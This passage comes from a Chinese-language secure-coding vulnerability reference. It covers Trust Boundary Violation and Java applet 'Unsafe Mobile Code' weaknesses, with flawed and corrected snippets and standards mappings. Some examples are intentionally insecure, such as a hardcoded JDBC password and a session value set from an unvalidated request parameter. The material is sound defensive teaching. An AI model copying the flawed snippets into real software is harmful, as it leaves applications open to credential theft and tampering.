<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Trust-Boundary-Violation"><a href="#Trust-Boundary-Violation" class="headerlink" title="Trust Boundary Violation"></a>Trust Boundary Violation</h4><h5 id="ABSTRACT-134"><a href="#ABSTRACT-134" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在同一数据结构中将可信赖数据和不可信赖数据混合在一起会导致程序员错误地信赖未验证的数据。</p>
<h5 id="EXPLANATION-135"><a href="#EXPLANATION-135" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>信任边界可以理解为在程序中划分的分界线。分界线的一边是不可信赖的数据。分界线的另一边则是被认定为是可信赖的数据。验证逻辑的用途是允许数据安全地跨越信任边界 — 从不可信赖的一边移动到可信赖的另一边。</p>
<p>当程序使可信赖和不可信赖的分界线模糊不清时，就会发生 Trust Boundary Violation 漏洞。发生这种错误的最普遍方式是允许可信赖的数据和不可信赖的数据共同混合在同一数据结构中。</p>
<p>示例：以下 Java 代码接受了一个 HTTP 请求。在 HTTP 会话对象中存储了 usrname 参数以后，再进行检查，以确保该用户已经过了验证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usrname = request.getParameter(&quot;usrname&quot;);</span><br><span class="line"></span><br><span class="line">if (session.getAttribute(ATTR_USR) != null) &#123;</span><br><span class="line"></span><br><span class="line">    session.setAttribute(ATTR_USR, usrname);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若不对信任边界进行合理构建及良好维护，则程序员不可避免地会混淆哪些数据已经过验证，哪些尚未经过验证。这种混淆最终会导致某些数据未经验证就加以使用了。</p>
<h5 id="RECOMMENDATIONS-134"><a href="#RECOMMENDATIONS-134" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在应用程序中定义信任边界。不要在数据结构中储存在某些环境下受信任而在其他环境下又转而不可信赖的数据。应尽量减少数据跨越信任边界的方式。</p>
<p>在处理输入之前，需要通过一系列用户交互来累积输入时，有时就会出现 Trust Boundary Violation 漏洞。所以，在得出所有数据之前，不可能进行完整的输入验证。在这种情况下，维护信任边界仍然是非常重要的。应将不可信赖的数据添加到一个不受信任数据结构中，待验证后，再移至可信赖的区域。</p>
<h5 id="REFERENCES-133"><a href="#REFERENCES-133" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[2] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 501</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Unsafe-Mobile-Code-Access-Violation"><a href="#Unsafe-Mobile-Code-Access-Violation" class="headerlink" title="Unsafe Mobile Code: Access Violation"></a>Unsafe Mobile Code: Access Violation</h4><h5 id="ABSTRACT-135"><a href="#ABSTRACT-135" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它从 public 访问方法中返回了一个 private 数组变量。</p>
<h5 id="EXPLANATION-136"><a href="#EXPLANATION-136" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序可以从 public 访问方法中返回一个 private 数组变量，通过此种方式，您可以调用代码来修改该数组的内容，还可以轻易地获取数组的 public 访问，并阻止程序员将其设置为 private 的计划。</p>
<p>例 1：以下 Java Applet 代码错误地从 public 访问方法中返回了一个 private 数组变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL[] urls;</span><br><span class="line"></span><br><span class="line">public URL[] getURLs() &#123;</span><br><span class="line"></span><br><span class="line">	return urls;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-135"><a href="#RECOMMENDATIONS-135" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要从 public 访问方式中返回 private 数组变量。应该在访问方法中提供对 private 成员数组的控制访问。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private URL[] urls;</span><br><span class="line"></span><br><span class="line">public void modifyURLs() &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-134"><a href="#REFERENCES-134" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 495</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Database-Access"><a href="#Unsafe-Mobile-Code-Database-Access" class="headerlink" title="Unsafe Mobile Code: Database Access"></a>Unsafe Mobile Code: Database Access</h4><h5 id="ABSTRACT-136"><a href="#ABSTRACT-136" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在不可信赖的环境中执行 JDBC 数据库操作的 Applet 会危及数据库凭证安全。</p>
<h5 id="EXPLANATION-137"><a href="#EXPLANATION-137" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，允许 Java Applet 将数据库连接打开回它们从其下载的服务器。在可信赖的环境中，这是可接受的；然而，在不可信赖的环境中，攻击者可能会使用 Applet 查找数据库凭证，并最终获得对数据库的直接访问。</p>
<p>例 1：以下代码显示在 applet 中使用的硬编码的数据库密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class CustomerServiceApplet extends JApplet</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public void paint(Graphics g)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        conn = DriverManager.getConnection (&quot;jdbc:mysql://db.example.com/customerDB&quot;, &quot;csr&quot;, &quot;p4ssw0rd&quot;);</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>具有硬编码的 JDBC 凭证的 Applet 用户可以容易地找到凭证，因为 Applet 代码已下载到客户端。此外，如果通过未加密的通道建立数据库连接，那么能够在网络上截取信息流的任何人也可以获得这些凭证。最后，允许用户直接连接到数据库会暴露可公开访问的数据库服务器，这使得攻击者能够将该数据库作为直接网络攻击的目标。</p>
<h5 id="RECOMMENDATIONS-136"><a href="#RECOMMENDATIONS-136" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不要使用将在客户端分布的代码对敏感凭证进行硬编码。要避免在必须连接到数据库的 Applet 中进行此操作，代理数据库将请求通过中间主机（如 Web 服务）。 例 2：以下代码将使用用户提供的凭证通过 Web 服务调用检索数据，而不是直接连接到具有硬编码凭证的数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class CustomerServiceApplet extends JApplet</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public void paint(Graphics g)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        CustomerRecord crec = WebServiceClient.getCustomerData(username, password, customerID);     //username and password entered by applet user</span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-135"><a href="#REFERENCES-135" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JDBC Guide: Getting Started - Security Considerations Sun Microsystems, Inc.</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 305</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Inner-Class"><a href="#Unsafe-Mobile-Code-Inner-Class" class="headerlink" title="Unsafe Mobile Code: Inner Class"></a>Unsafe Mobile Code: Inner Class</h4><h5 id="ABSTRACT-137"><a href="#ABSTRACT-137" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它使用了一个 inner class。</p>
<h5 id="EXPLANATION-138"><a href="#EXPLANATION-138" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Inner class 转换为 Java 字节码所采用的方式，导致它会悄然引入一些安全问题。在 Java 源代码中，inner class 只能由封装类来声明它是可以访问的，但是 Java 字节码中并没有 inner class 的概念，因此，编译器必须把一个内部类声明转换成与 package 有同等级别的类（有权访问源外部类）。由于内部类可以访问其封装类中的 private 字段，一旦某个 inner class 成为字节码中的同等类，该编译器便会把 inner class 访问的 private 字段转换成 protected 字段，这一点具有潜在的危险性。</p>
<p>例 1：以下 Java Applet 代码错误地使用了 inner class。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private final class urlHelper &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-137"><a href="#RECOMMENDATIONS-137" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>避免使用 inner class。若必须使用，请仔细考虑编译器所要执行的转化行为带来的各种影响。是否可以把 private 字段降级为 protected？</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">private final class urlHelper &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-136"><a href="#REFERENCES-136" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 492</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Public-finalize-Method"><a href="#Unsafe-Mobile-Code-Public-finalize-Method" class="headerlink" title="Unsafe Mobile Code: Public finalize() Method"></a>Unsafe Mobile Code: Public finalize() Method</h4><h5 id="ABSTRACT-138"><a href="#ABSTRACT-138" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它将 finalize() 方法声明为 public。</p>
<h5 id="EXPLANATION-139"><a href="#EXPLANATION-139" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>除非在 finalize() 的实现方法内部调用 super.finalize()，否则请不要显式地调用 finalize。在移动代码中，手动垃圾回收这种带有错误倾向的操作会威胁到系统的安全，由于 finalize() 的声明中包含对 public 访问，因此会造成攻击者的恶意调用。如果您按其最初设计使用 finalize()，则应首先声明 finalize() 包含 protected 访问权限。</p>
<p>例 1：以下 Java Applet 代码错误地声明了一种 public finalize() 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public void finalize() &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-138"><a href="#RECOMMENDATIONS-138" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当避免使用 finalize()。因为它很不可信。千万不要将 finalize() 方法声明为 public。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">protected void finalize()&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-137"><a href="#REFERENCES-137" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] MET12-J. Do not use finalizers CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 583</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[11] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Unsafe-Array-Declaration"><a href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration" class="headerlink" title="Unsafe Mobile Code: Unsafe Array Declaration"></a>Unsafe Mobile Code: Unsafe Array Declaration</h4><h5 id="ABSTRACT-139"><a href="#ABSTRACT-139" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它声明了数组 public、final 和 static。</p>
<h5 id="EXPLANATION-140"><a href="#EXPLANATION-140" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在大多数情况下，把数组声明为 public、final 和 static 是一个 bug。因为数组是一个可变的对象，而 final 限制要求数组对象本身只能分配一次，但并不保证数组元素的数值不变。既然数组是公用的，恶意程序便可以篡改数组中存储的值。所以，在大多数情况下，应将数组设置为 private。</p>
<p>例 1：以下 Java Applet 代码错误地把一个数组声明为 public、final 和 static。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public final static URL[] urls;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-139"><a href="#RECOMMENDATIONS-139" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>因为数组的内容不受 final 关键字的保护，所以数组必须声明为 private。无论什么时候，尽可能把所有成员变量都设置为 private。通过设置和获取的方法提供针对 private 成员变量的可控制的访问方式。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">private static final URL[] urls;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-138"><a href="#REFERENCES-138" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. McGraw Securing Java. Chapter 7: Java Security Guidelines</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 582</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Unsafe-Mobile-Code-Unsafe-Public-Field"><a href="#Unsafe-Mobile-Code-Unsafe-Public-Field" class="headerlink" title="Unsafe Mobile Code: Unsafe Public Field"></a>Unsafe Mobile Code: Unsafe Public Field</h4><h5 id="ABSTRACT-140"><a href="#ABSTRACT-140" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序违反了移动代码的安全编码原则，它声明了成员变量 public，而不是 final。</p>
<h5 id="EXPLANATION-141"><a href="#EXPLANATION-141" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 Applet 及其所使用的类中，所有 public 的成员变量都应声明 final，以防止攻击者未经授权，操纵或获取对 Applet 内部状态的访问权。</p>
<p>例 1：以下 Java Applet 代码错误地声明了成员变量 public，而不是 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public final class urlTool extends Applet &#123;</span><br><span class="line"></span><br><span class="line">public URL url;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>移动代码，在本例中也就是 Java Applet，通过网络进行传递并在远程机器上运行。因为移动代码的编写者很难控制其所编写代码的运行环境，所以在安全上提出特别的要求理所当然。一个最大的环境威胁在于，移动代码可以伴随其他潜在的恶意移动代码一起运行。因为所有的主流 web 浏览器会在同一 JVM 中执行来自多个来源的代码，所以，许多移动代码的安全指导原则都很关注可以访问到运行着您程序的同一虚拟机的攻击者，避免他们操纵您的对象的状态和行为。</p>
<h5 id="RECOMMENDATIONS-140"><a href="#RECOMMENDATIONS-140" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>无论什么时候，尽可能把所有成员变量都设置为 private。通过设置和获取的方法提供针对 private 成员变量的可控制的访问方式。如果要求某个字段为公共访问，那么同时将其声明为 final。</p>
<p>例 2：例 1 中的代码可以使用以下任意一种方式进行重写：</p>
